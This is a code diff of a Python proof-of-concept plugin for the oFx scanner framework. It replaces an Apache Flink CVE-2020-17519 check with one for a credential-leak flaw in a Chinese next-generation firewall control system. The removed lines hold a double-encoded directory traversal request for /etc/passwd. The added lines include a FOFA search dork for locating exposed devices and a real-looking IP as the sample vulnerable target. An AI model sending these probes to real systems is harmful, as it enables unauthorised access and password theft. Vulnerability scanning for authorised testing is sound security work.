@@ -2,7 +2,6 @@
 import requests
 from lib.core.common import url_handle,get_random_ua
 from lib.core.poc import POCBase
-
 # ...
 import urllib3
 urllib3.disable_warnings()
@@ -18,22 +17,22 @@ class POC(POCBase):
         略  
         """,                                # POC描述，写更新描述，没有就不写
 
-        "name" : "Apache Flink目录穿透(CVE-2020-17519)",                        # 漏洞名称
-        "VulnID" : "CVE-2020-17519",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
-        "AppName" : "Apache Flink",                     # 漏洞应用名称
-        "AppVersion" : "Apache Flink 1.11.0",                  # 漏洞应用版本
-        "VulnDate" : "2020-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
+        "name" : "中科网威 下一代防火墙控制系统 账号密码泄露漏洞",                        # 漏洞名称
+        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
+        "AppName" : "中科网威 下一代防火墙控制系统",                     # 漏洞应用名称
+        "AppVersion" : "",                  # 漏洞应用版本
+        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
         "VulnDesc" : """
-        
+            中科网威 下一代防火墙控制系统 存在账号密码泄露漏洞，
+            攻击者通过前端获取密码的Md5后解密可获取完整密码登陆后台
         """,                                # 漏洞简要描述
 
-        "fofa-dork":"",                     # fofa搜索语句
-        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
+        "fofa-dork":"""
+            body="Get_Verify_Info(hex_md5(user_string)."
+        """,                     # fofa搜索语句
+        "example" : "https://222.180.24.13:7071",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
-
     }
-
-    timeout = 10
 
     def _verify(self):
         """
@@ -44,7 +43,8 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
-        url = self.target + "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd" # url自己按需调整
+        url = self.target + "" # url自己按需调整
+        
 
         headers = {"User-Agent":get_random_ua(),
                     "Connection":"close",
@@ -53,16 +53,17 @@ class POC(POCBase):
         
         try:
             """
-            检测逻辑，漏洞存在则修改vuln值，漏洞不存在则不动
+            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
             req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if req.status_code == 200 and "root:/root" in req.text:
+            if "var persons = [{\"name\"" in req.text and ",\"flag\":" in req.text and req.status_code == 200:
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
         except Exception as e:
             raise e
-
+        
+        # 以下逻辑酌情使用
         if self._honeypot_check(vuln[1]) == True:
             vuln[0] = False
         
